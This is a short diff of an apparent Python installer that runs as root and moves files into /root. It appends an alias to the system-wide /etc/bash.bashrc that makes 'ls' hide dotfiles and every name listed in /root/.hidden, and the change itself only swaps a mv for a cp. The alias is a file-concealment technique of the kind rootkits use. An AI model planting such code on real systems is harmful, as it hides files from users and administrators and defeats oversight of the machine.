@@ -85,7 +85,7 @@ os.system("mv bt.py /root/")
 os.chdir("/root/revolution")
 os.system("mv  /root/revolution/.hidden /root/.hidden")
 
-os.system("mv  /etc/bash.bashrc /etc/bash.bashrc.bkp")
+os.system("cp  /etc/bash.bashrc /etc/bash.bashrc.bkp")
 file = open("/etc/bash.bashrc","a")
 file.write( "alias ls=\"export GLOBIGNORE_TMP=$GLOBIGNORE; export GLOBIGNORE=$GLOBIGNORE:.*:$(tr \'\\n\' \':\' < /root/.hidden); ls -dC * ;export GLOBIGNORE=$GLOBIGNORE_TMP; export GLOBIGNORE_TMP=\'\'\"")
 file.close()
